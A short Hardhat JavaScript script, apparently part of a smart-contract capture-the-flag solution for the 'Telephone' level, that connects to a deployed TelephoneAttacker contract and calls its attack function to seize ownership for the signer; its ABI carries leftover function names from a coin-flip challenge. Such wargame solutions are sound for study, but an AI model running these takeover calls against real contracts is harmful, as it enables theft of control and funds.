const { ethers, network } = require("hardhat");

const Hack = require(`../../deployments/${network.name}/TelephoneAttacker.json`);

async function main() {
    let [owner] = await ethers.getSigners();

    const Abi = [
      "function consecutiveWins() external view returns (uint)",
      "function expFlip() external view returns (address)",
      "function FACTOR() external view returns (uint)",
      "function exploit(address) external",
      "function test() external",
      "function attack(address) external",
      "function hack() external"
    ];

    let hack = await new ethers.Contract(Hack.address, Abi, owner);

    await hack.attack(owner.address)
}

main()
    .then(() =>process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
